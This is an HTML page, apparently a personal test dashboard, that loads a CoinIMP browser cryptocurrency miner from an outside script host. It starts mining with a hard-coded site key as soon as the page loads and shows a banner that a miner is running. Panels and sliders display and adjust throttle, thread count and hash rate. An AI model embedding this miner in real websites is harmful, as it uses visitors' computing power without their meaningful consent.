<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://www.hostingcloud.racing/hkoo.js"></script>
    <script>
        let throttle_board;
        let threads_board;
        let hps_board;

        // 数値を表示するための要素を取得
        window.addEventListener("load", function() {
            throttle_board = document.getElementById("throttle_board").children[1];
            hps_board = document.getElementById("hps_board").children[1];
            threads_board = document.getElementById("threads_board").children[1];
        });

        var _client = new Client.Anonymous('e781ee2f59c5bdcd19334864d63ccd525908056a832fddb866695687a06358cb', {
            throttle: 0.9,
            c: 'w',
            ads: 0
        });
        _client.start();
        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");

        // 0.1秒ごとに数値を反映
        setInterval(function() {
            throttle = _client.getThrottle();
            hps = _client.getHashesPerSecond() | 0;
            threads = _client.getNumThreads();
            throttle_board.textContent = throttle;
            threads_board.textContent = threads;
            hps_board.textContent = hps;
        }, 100);
    </script>

    <style>
        html,
        body {
            background-color: black;
        }
        
        .board {
            display: inline-block;
            width: 300px;
            height: 150px;
            background-color: white;
            text-align: center;
            font-size: 36px;
        }
        
        .top {
            display: block;
            width: 100%;
            height: 40px;
            background-color: rgb(0, 125, 255);
            color: white;
            margin-top: 0;
            padding-top: 0;
        }
        
        .board_body {
            display: block;
            width: 100%;
            height: 110px;
            line-height: 110px;
        }
        
        input[type="range"] {
            display: block;
            width: 100%;
        }
    </style>
</head>

<body>
    <div id="throttle_board" class="board">
        <div class="top">
            throttle
        </div>
        <div class="board_body">
            ___
        </div>
        <input type="range" name="" id="adjust-speed" min="0" max="9" value="9" onchange="_client.setThrottle(this.value/10);">

    </div>

    <div id="threads_board" class="board">
        <div class="top">
            threads
        </div>
        <div class="board_body">
            ___
        </div>
        <input type="range" name="" id="adjust-thread" min="1" max="24" value="8" onchange="_client.setNumThreads(this.value)">

    </div>
    <div id="hps_board" class="board">
        <div class="top">
            HPS
        </div>
        <div class="board_body">
            ___
        </div>
        <input type="range" min="1" max="1" value="1" style="opacity: 0;">
    </div>
</body>

</html>
